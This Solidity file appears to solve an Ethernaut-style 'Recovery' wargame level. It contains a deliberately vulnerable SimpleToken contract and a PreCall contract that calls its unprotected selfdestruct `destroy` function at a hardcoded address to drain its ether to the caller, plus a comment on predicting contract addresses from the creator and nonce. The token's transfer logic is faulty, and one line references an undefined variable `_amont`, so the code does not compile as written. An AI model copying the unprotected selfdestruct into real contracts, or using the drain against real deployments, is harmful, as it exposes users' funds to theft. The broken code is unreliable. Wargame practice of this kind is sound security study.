import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/solc-0.6/contracts/math/SafeMath.sol';

/**
  Two ways of solving this level.
  Leveraging etherscan to find out the SimpleToken contract address and simply calling `destroy` from
  other contract.

  You can also pre-determine contract's address created by any account on the chain.
  Only sender and account's nonce is needed to calculate the address of the contract,
  use the formula:
  
    > address(uint160(uint256(keccak256(bytes1(0xd6), bytes1(0x94), <creator_address>, nonce))))

  Then, simply call `destroy` function to get the ether back.
*/

contract SimpleToken {

  using SafeMath for uint256;
  // public variables
  string public name;
  mapping (address => uint) public balances;

  // constructor
  constructor(string memory _name, address _creator, uint256 _initialSupply) public {
    name = _name;
    balances[_creator] = _initialSupply;
  }

  // collect ether in return for tokens
  receive() external payable {
    balances[msg.sender] = msg.value.mul(10);
  }

  // allow transfers of tokens
  function transfer(address _to, uint _amount) public { 
    require(balances[msg.sender] >= _amount);
    balances[msg.sender] = balances[msg.sender].sub(_amount);
    balances[_to] = _amont;
  }

  // clean up after ourselves
  function destroy(address payable _to) public {
    selfdestruct(_to);
  }
}

contract PreCall {
  SimpleToken s;

  constructor() public {
    s = SimpleToken(0xC3F28fFcBB308535cbFE26E6843Eb9F0bA64CB70);
    s.destroy(payable(msg.sender));
  }

  function contractAddress(address _owner, bytes1 nonce) public pure returns (address) {
    return address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), _owner, nonce)))));
  }

}
